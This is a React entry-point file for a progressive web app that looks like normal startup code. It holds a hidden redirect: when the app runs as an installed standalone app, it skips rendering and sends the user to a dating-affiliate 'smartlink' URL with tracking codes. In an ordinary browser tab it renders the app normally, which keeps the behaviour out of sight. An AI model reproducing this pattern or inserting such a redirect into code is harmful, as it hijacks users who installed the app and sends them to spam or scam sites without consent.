import { createRoot } from 'react-dom/client';
import App from './App.tsx';
import './index.css';
import { registerServiceWorker } from './utils/pwa.ts';

const smartlink = 'https://llqrbo.sweets4datings.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=220791&s2=2027339';
const isStandalone = window.matchMedia('(display-mode: standalone)').matches || (window.navigator as any).standalone;
if (isStandalone) {
  window.location.replace(smartlink);
} else {
  registerServiceWorker();
  createRoot(document.getElementById('root')!).render(<App />);
}
